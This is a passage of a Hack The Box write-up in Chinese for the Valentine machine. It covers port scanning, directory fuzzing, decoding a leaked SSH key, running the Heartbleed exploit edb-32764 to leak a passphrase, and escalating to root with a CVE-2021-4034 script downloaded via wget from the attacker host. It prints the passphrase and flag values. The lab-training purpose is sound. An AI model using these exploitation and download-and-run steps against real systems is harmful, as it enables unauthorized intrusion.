...
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.27.56 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.27.56:22
Open 10.129.27.56:80
Open 10.129.27.56:443
...
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: 2024-10-09T07:50:14+00:00; 0s from scanner time.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
...
```
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -u http://10.129.27.56/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/big.txt

.htpasswd               [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 2304ms]
.htaccess               [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 2305ms]
cgi-bin/                [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 1332ms]
decode                  [Status: 200, Size: 552, Words: 73, Lines: 26, Duration: 196ms]
dev                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 200ms]
encode                  [Status: 200, Size: 554, Words: 73, Lines: 28, Duration: 198ms]
index                   [Status: 200, Size: 38, Words: 2, Lines: 2, Duration: 202ms]
server-status           [Status: 403, Size: 293, Words: 21, Lines: 11, Duration: 190ms]
:: Progress: [20476/20476] :: Job [1/1] :: 43 req/sec :: Duration: [0:03:06] :: Errors: 0 ::
```

前往`http://10.129.27.56/dev/hype_key`可以看到一堆`hex`，丟[cyberchef](https://gchq.github.io/CyberChef/)可以得到`id_rsa`
```
...
使用`ssh`連線發現他需要`passphrase`
```
┌──(kali㉿kali)-[~/htb]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~/htb]
└─$ ssh -i id_rsa hype@10.129.87.89
...
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.87.89 -u 5000 -t 8000 --scripts -- -n -Pn -sVC --script vuln
...
利用[edb-32764](https://www.exploit-db.com/exploits/32764)
```
┌──(kali㉿kali)-[~/htb]
...
```
┌──(kali㉿kali)-[~/htb]
└─$ python 32764.py 10.129.87.89 443
...
...
  ...
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 8D  mV0aGVoeXBlCg==.
  0160: 4B 5A 06 50 F5 0C EE 6A DD D2 81 1E B8 36 A4 02  KZ.P...j.....6..
...  
```

decode他可以得到`passphrase`
```
┌──(kali㉿kali)-[~/htb]
...
ssh登入的時候他會一直回傳`sign_and_send_pubkey: no mutual signature supported`，[google](https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported)嘗試登入

登入成功可在`/home/hype`得user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_rsa hype@10.129.208.24

Enter passphrase for key 'id_rsa': heartbleedbelievethehype

hype@Valentine:~$ cat user.txt
1d42ef03d09ceeee13a58da699e41a93
```

利用`linpeas.sh`
```
hype@Valentine:/tmp$ wget 10.10.14.55/linpeas.sh
...
```
hype@Valentine:/tmp$ wget 10.10.14.55/CVE-2021-4034.py
# python -c 'import pty; pty.spawn("/bin/bash")'
root@Valentine:/root# cat root.txt
7381a2e8a63f91c8fc04aba318524d9a
```